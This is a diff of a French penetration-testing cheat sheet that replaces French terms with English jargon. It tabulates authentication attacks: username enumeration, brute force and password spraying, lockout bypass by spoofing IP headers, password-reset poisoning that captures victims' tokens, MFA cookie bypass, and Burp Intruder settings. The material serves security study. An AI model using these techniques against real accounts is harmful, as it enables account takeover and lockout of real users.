 | AUT-1 | Noms d'utilisateur à tester en priorité | Réponse différente pour un nom valide | Tri par longueur de réponse dans Intruder |
 | AUT-2 | Réponses presque identiques | Une réponse avec une différence minime (par exemple un point final manquant) | Grep - Extract sur le message d'erreur |
-| AUT-3 | Hachage exécuté seulement si le nom existe | Temps de réponse nettement plus long | Un blocage par IP est à contourner en parallèle |
-| AUT-4 | Verrouillage après plusieurs essais | Message de verrouillage sur un seul nom | Cluster bomb avec Null payloads répétés 5 fois ; verrouille de vrais comptes sur une cible réelle |
+| AUT-3 | Hachage exécuté seulement si le nom existe | Temps de réponse nettement plus long | Un blocage par IP demande un bypass en parallèle |
+| AUT-4 | Account lockout après plusieurs essais | Message d'account lockout sur un seul nom | Cluster bomb avec Null payloads répétés 5 fois ; provoque un account lockout sur de vrais comptes sur une cible réelle |
 | AUT-5 | Inscription ou mot de passe oublié | Message de nom déjà utilisé ou message différent | Souvent uniformisé |
 
 ```text
@@ -1591,8 +1591,8 @@ prenom.nom@domaine
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
 | AUT-6 | Politique de complexité | Redirection (302) pour le bon mot de passe | Mutations prévisibles ; substitutions de lettres : o par 0, a par 4, e par 3 |
-| AUT-7 | Verrouillage par compte | Redirection sur un nom | Un mot de passe, plusieurs noms (password spraying) |
-| AUT-8 | Corps JSON, limitation par requête | Connexion réussie en une requête | Tous les candidats dans un tableau |
+| AUT-7 | Account lockout par compte | Redirection sur un nom | Un mot de passe, plusieurs noms (password spraying) |
+| AUT-8 | Corps JSON, rate limiting par requête | Connexion réussie en une requête | Tous les candidats dans un tableau |
 
 ```text
 # AUT-6 mot de passe predictible
@@ -1605,12 +1605,12 @@ Passw0rd
 "password":["123456","password","qwerty"]
 ```
 
-### Authentication - Contournement de blocage
+### Authentication - Bypass de l'account lockout
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
-| AUT-9 | L'adresse IP est lue dans un en-tête | Plus de blocage quand la valeur change | Ne fonctionne pas si un proxy réécrit l'en-tête |
-| AUT-10 | Même cas, autres en-têtes | Idem | Si le premier est ignoré |
+| AUT-9 | L'adresse IP est lue dans un header | Plus de blocage quand la valeur change | Ne fonctionne pas si un proxy réécrit le header |
+| AUT-10 | Même cas, autres headers | Idem | Si le premier est ignoré |
 | AUT-11 | Compteur remis à zéro après un succès | Aucun blocage sur les essais | Alterner un identifiant valide et un candidat avec Pitchfork et une requête simultanée |
 
 ```text
@@ -1634,12 +1634,12 @@ Pour AUT-9, un script qui change l'adresse à chaque requête figure dans [[#Out
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
-| AUT-12 | Lien de réinitialisation construit depuis l'en-tête | Requête de la victime dans le journal de l'exploit server, avec le jeton | Tester aussi X-Forwarded-Server et X-Host ; la victime doit cliquer |
-| AUT-13 | Jeton non revalidé | La requête réussit encore | Supprimer le jeton de l'URL et du corps |
+| AUT-12 | Lien de réinitialisation construit depuis le header | Requête de la victime dans le journal de l'exploit server, avec le token | Tester aussi X-Forwarded-Server et X-Host ; la victime doit cliquer |
+| AUT-13 | Token non revalidé | La requête réussit encore | Supprimer le token de l'URL et du corps |
 | AUT-14 | Champ d'identité modifiable dans le corps | Mot de passe de l'autre compte changé | Même famille que AUT-13 |
-| AUT-15 | Changement de mot de passe avec mot de passe actuel | Un seul message différent selon le mot de passe actuel | Verrouillage si les deux nouveaux mots de passe sont identiques ; le message `New passwords do not match` n'apparaît que si le candidat est correct |
+| AUT-15 | Changement de mot de passe avec mot de passe actuel | Un seul message différent selon le mot de passe actuel | Account lockout si les deux nouveaux mots de passe sont identiques ; le message `New passwords do not match` n'apparaît que si le candidat est correct |
 | AUT-16 | Adresse e-mail dupliquée | Lien reçu pour un autre compte | Dépend du serveur |
-| AUT-17 | Génération faible du jeton | Jetons successifs proches | Demander plusieurs jetons et les comparer |
+| AUT-17 | Génération faible du token | Tokens successifs proches | Demander plusieurs tokens et les comparer |
 
 ```text
 # AUT-12 reinitialisation en-tete host
@@ -1684,8 +1684,8 @@ echo -n '<VALEUR>' | md5sum
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
-| AUT-21 | Réponse 401 avec l'en-tête WWW-Authenticate de type Basic | Nom et mot de passe en clair après décodage | Sans HTTPS ni HSTS, interception possible |
-| AUT-22 | Force brute de l'en-tête | 200 au lieu de 401 | Intruder avec Encode Base64 ; limitation ou blocage par IP possibles |
+| AUT-21 | Réponse 401 avec le header WWW-Authenticate de type Basic | Nom et mot de passe en clair après décodage | Sans HTTPS ni HSTS, interception possible |
+| AUT-22 | Brute force du header | 200 au lieu de 401 | Intruder avec Encode Base64 ; rate limiting ou blocage par IP possibles |
 
 ```text
 # AUT-21 http basic
@@ -1697,14 +1697,14 @@ Authorization: Basic base64(<UTILISATEUR>:<VALEUR>)
 Note détaillée : [[Multi-factor-authentication]] ; fiches : [[MFA-acces-direct]], [[MFA-logique-defaillante]], [[MFA-brute-force-code]], [[MFA-reponse-et-secours]]
 
 **Quand l'utiliser** : une connexion exige un second facteur (code à usage unique) après le mot de passe.
-**Détection** : après la première étape, tester l'accès direct à une page réservée, regarder si l'identité est portée par un cookie modifiable, puis mesurer la limitation des essais du code.
+**Détection** : après la première étape, tester l'accès direct à une page réservée, regarder si l'identité est portée par un cookie modifiable, puis mesurer le rate limiting des essais du code.
 
-### Multi-factor authentication - Contournement de l'étape
+### Multi-factor authentication - Bypass de l'étape
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
 | MFA-1 | Session déjà considérée comme connectée après l'étape 1 | Page de compte affichée | Naviguer vers l'URL réservée sans jamais soumettre le code |
-| MFA-2 | Identité portée par un cookie entre les deux étapes | Le code est généré pour le compte visé, puis la redirection 302 suit le bon code | Le cookie de liaison d'identité s'appelle `verify` ; la limitation d'essais et la durée de vie du code restreignent l'attaque |
+| MFA-2 | Identité portée par un cookie entre les deux étapes | Le code est généré pour le compte visé, puis la redirection 302 suit le bon code | Le cookie de liaison d'identité s'appelle `verify` ; le rate limiting et la durée de vie du code restreignent l'attaque |
 | MFA-3 | Flux parallèles : réinitialisation, OAuth, API mobile | Session ouverte sans code | Dépend de l'application |
 
 ```text
@@ -1718,7 +1718,7 @@ POST /login2
 Cookie: verify=<UTILISATEUR>
 ```
 
-### Multi-factor authentication - Force brute du code
+### Multi-factor authentication - Brute force du code
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
@@ -1754,7 +1754,7 @@ La valeur d'origine de la réponse est `"verified":false` ; la valeur à essayer
 
 Les réglages d'outil sont rassemblés ici ; les thèmes ci-dessus y renvoient. Gabarit identique, sans colonne de moteur.
 
-**Quand l'utiliser** : pour automatiser un test d'un thème (énumération, force brute, mesure de délai, relevé d'interactions).
+**Quand l'utiliser** : pour automatiser un test d'un thème (énumération, brute force, mesure de délai, relevé d'interactions).
 **Détection** : sans objet, voir le thème concerné.
 
 ### Outils Burp - Intruder
@@ -1763,19 +1763,19 @@ Les réglages d'outil sont rassemblés ici ; les thèmes ci-dessus y renvoient. 
 |---|---|---|---|
 | BRP-1 | Positions | Marquer la valeur à faire varier entre deux paragraphes | Le format de la marque est `§X§` |
 | BRP-2 | Sniper | Une position, une liste | Mots de passe d'un compte, numéros d'identifiant |
-| BRP-3 | Pitchfork | Deux listes alignées | En-tête de substitution d'adresse IP et candidat ; alternance d'un compte valide et d'un essai (avec une requête simultanée) |
-| BRP-4 | Cluster bomb | Toutes les combinaisons | Verrouillage de compte avec Null payloads répétés ; index et caractère en injection aveugle |
+| BRP-3 | Pitchfork | Deux listes alignées | Header de substitution d'adresse IP et candidat ; alternance d'un compte valide et d'un essai (avec une requête simultanée) |
+| BRP-4 | Cluster bomb | Toutes les combinaisons | Account lockout avec Null payloads répétés ; index et caractère en Blind SQLi |
 | BRP-5 | Payload processing | Transformer chaque candidat avant l'envoi | Hash MD5, Add prefix, Encode Base64 pour un cookie persistant |
-| BRP-6 | Grep - Match | Repérer un texte dans chaque réponse | Message de réussite en injection aveugle, texte d'une page connectée |
+| BRP-6 | Grep - Match | Repérer un texte dans chaque réponse | Message de réussite en Blind SQLi, texte d'une page connectée |
 | BRP-7 | Grep - Extract | Extraire un fragment du message d'erreur | Différences subtiles entre deux messages |
-| BRP-8 | Liste de payloads dédiée | Fuzzing - path traversal | Liste intégrée de Burp pour la traversée de chemin |
+| BRP-8 | Liste de payloads dédiée | Fuzzing - path traversal | Liste intégrée de Burp pour le path traversal |
 | BRP-9 | Payload Numbers | Séquence de nombres | Octet de 1 à 255 pour un balayage, code à quatre chiffres |
 
 ### Outils Burp - Turbo Intruder
 
 | Réf. | Outil | Usage | Remarque |
 |---|---|---|---|
-| BRP-10 | Script de changement d'adresse | Contournement de blocage par IP | Un seul marqueur de position sur le mot de passe ; l'adresse remplace une valeur de substitution dans la requête de base |
+| BRP-10 | Script de changement d'adresse | Bypass de blocage par IP | Un seul marqueur de position sur le mot de passe ; l'adresse remplace une valeur de substitution dans la requête de base |
 
 ```python
 # BRP-10 turbo intruder adresse ip aleatoire
@@ -1804,7 +1804,7 @@ def handleResponse(req, interesting):
 |---|---|---|---|
 | BRP-11 | Collaborator | Obtenir un sous-domaine d'interaction pour `<COLLAB>` | Nécessite Burp Suite Professional |
 | BRP-12 | Poll now | Relever les interactions DNS et HTTP reçues | Attendre un court délai après l'envoi ; un DNS seul peut venir d'un résolveur intermédiaire |
-| BRP-13 | Exploit server | Domaine alternatif pour `<COLLAB>` et journal d'accès | Sert à lire les requêtes de la victime, par exemple un jeton ou un cookie |
+| BRP-13 | Exploit server | Domaine alternatif pour `<COLLAB>` et journal d'accès | Sert à lire les requêtes de la victime, par exemple un token ou un cookie |
 
 ### Outils Burp - Resource pool et sessions
 
@@ -1813,4 +1813,4 @@ def handleResponse(req, interesting):
 | BRP-14 | Resource pool | Limiter à une requête simultanée | Délais mesurés, alternance de compte, macro de session |
 | BRP-15 | Macro | Rejouer les étapes de connexion avant chaque essai | Par exemple une requête GET de la page de connexion, un POST de connexion, un GET de la page du code |
 | BRP-16 | Règle de gestion de session | Lancer la macro avant chaque requête de l'attaque | Utile quand la session est coupée après quelques échecs |
-| BRP-17 | Filtre Images de l'historique du proxy | Retrouver l'adresse de service des fichiers téléversés | Onglet HTTP history du proxy |
+| BRP-17 | Filtre Images de l'historique du proxy | Retrouver l'adresse de service des fichiers envoyés | Onglet HTTP history du proxy |
